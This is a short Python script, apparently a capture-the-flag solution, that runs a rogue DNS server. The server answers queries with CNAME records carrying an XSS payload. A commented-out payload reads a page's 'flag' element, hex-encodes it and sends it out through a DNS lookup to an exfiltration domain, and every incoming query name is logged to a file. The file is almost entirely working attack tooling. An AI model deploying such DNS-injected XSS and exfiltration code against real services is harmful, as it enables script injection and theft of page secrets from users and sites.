import socket
from scapy.all import DNS, DNSQR, DNSRR, raw


xss = 'a="";document.getElementById("flag").innerText.split("").forEach((r)=>{a+=r.charCodeAt(0).toString(16)});a=a.substring(0,40);'
payload = '<img/src="http://ffffffuck.6d5c01f74b3f86e79153.d.zhack.ca"/>'
# payload = '</pre><script>a="";document.getElementById("flag").innerText.split("").forEach((r)=>{a+=r.charCodeAt(0).toString(16)});a=a.substring(0,40);document.createElement("img").src="http://"+a+".dns.exfil.com/x.png";</script>'

log = open('log.txt', 'w+b')

def handle_req(data):
    req = DNS(data)
    print(raw(req))
    req.show()

    print(req.qd.qname)
    log.write(req.qd.qname + b'\n')
    log.flush()

    resp = DNS(id=req.id,qd=req.qd,an=DNSRR(rrname=req.qd.qname, type='CNAME', ttl=64, rdata=payload))
    resp.show()
    
    return raw(resp)

udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udps.bind(('',53))
print('Listening on :53')

while 1:
    try:
        data, addr = udps.recvfrom(1024)
        print(addr)
        print(addr)
        print(addr)
        print(addr)
        print(addr)
        resp = handle_req(data)
        udps.sendto(resp, addr)
        print(addr)
        print(addr)
        print(addr)
        print(addr)
        print(addr)
        print('Response: %s -> %s' % (resp, addr))
    except KeyboardInterrupt:
        break
udps.close()
print('Bye')
